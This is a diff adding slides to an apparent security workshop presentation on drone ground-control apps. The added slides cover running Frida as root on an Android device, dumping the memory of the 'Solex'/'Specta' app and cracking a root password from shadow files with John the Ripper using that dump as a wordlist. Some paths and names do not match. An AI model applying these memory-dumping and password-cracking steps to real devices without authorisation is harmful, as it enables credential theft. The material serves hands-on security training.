@@ -371,6 +371,72 @@ wireshark gcs-app-traffic.pcap
 </li>
 </ol>
 </section>
+
+<section>
+    <h2>Dynamic Analysis of the Android Specta App</h2>
+    <p><em>Start the Specta App</em></p>
+<ul>
+<li>
+<p>Connect Phone to Internet WiFi Hot Spot</p>
+</li>
+<li>
+<p>Start Solex App</p>
+<ul>
+<li>Allow permissions</li>
+<li>You may need to reboot</li>
+</ul>
+</li>
+</ul>
+</section>
+
+<section>
+    <h2>Start the Frida Server on the Android Device</h2>
+    <pre><code class="language-bash"># login to the Android device
+adb shell
+# elevate to super user
+su -
+# change directories
+cd /data/local/tmp
+# verify frida-server is present
+ls
+# start the frida-server
+./frida-server &amp;
+# verify the server is running
+ps -ef | grep -i frida
+</code></pre>
+</section>
+
+<section>
+    <h2>Dump Memory from running Specta app to Laptop</h2>
+    <p>Start the Specta app on the Android device</p>
+<p>Then run the following commands</p>
+<pre><code class="language-bash">cd /home/kali/frida
+source frida_venv/bin/activate
+frida-ps -U | grep -i solex 
+# not the Process ID (PID)
+cd fridump3
+mkdir solex
+python3 fridump3.py -r -U 
+</code></pre>
+</section>
+
+<section>
+    <h2>Create a wordlist from the memory dump</h2>
+    <p>Save the file to the same directory we saved the passwd file earlier</p>
+<pre><code class="language-bash">cd solex
+sort -u strings.txt &gt; solex-strings-uniq.txt
+cp solex-strings-uniq.txt /home/kali/workshop/apps/john
+</code></pre>
+</section>
+
+<section>
+    <h2>Brute force the root password crack</h2>
+    <pre><code class="language-bash">cd ~/workshops/apps/john
+unshadow passwd shadow &gt; unshadow.txt
+john --wordlist=/home/kali/workshop/apps/frida/fridump3/solex/strings.uniq unshadow.txt
+</code></pre>
+<p><em>Congratulations! You just brute forced the root password</em></p>
+</section>
 </div>
 </div>
 <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reveal.js"></script>
